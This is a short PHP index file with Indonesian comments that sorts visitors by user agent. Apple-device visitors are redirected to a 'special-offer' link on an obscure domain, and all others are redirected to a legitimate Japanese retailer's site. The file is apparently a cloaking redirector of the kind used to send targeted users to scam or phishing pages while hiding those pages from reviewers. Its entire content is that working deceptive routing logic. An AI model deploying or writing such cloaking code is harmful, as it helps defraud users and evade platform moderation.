<?php
// index.php

// URL untuk Apple device
$appleRedirectUrl = "https://greenauraworld.com/2c3lbs?special-offer&key=heroku";

// URL untuk non-Apple device
$otherRedirectUrl = "https://yodobashi.com";

// Ambil user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Deteksi apakah user agent mengandung identitas Apple device
if (preg_match('/iPhone|iPad|iPod|Macintosh/i', $userAgent)) {
    // Jika Apple device, redirect ke halaman yang diizinkan
    header("Location: $appleRedirectUrl", true, 302);
    exit;
} else {
    // Jika bukan Apple device, redirect ke halaman lain
    header("Location: $otherRedirectUrl", true, 302);
    exit;
}
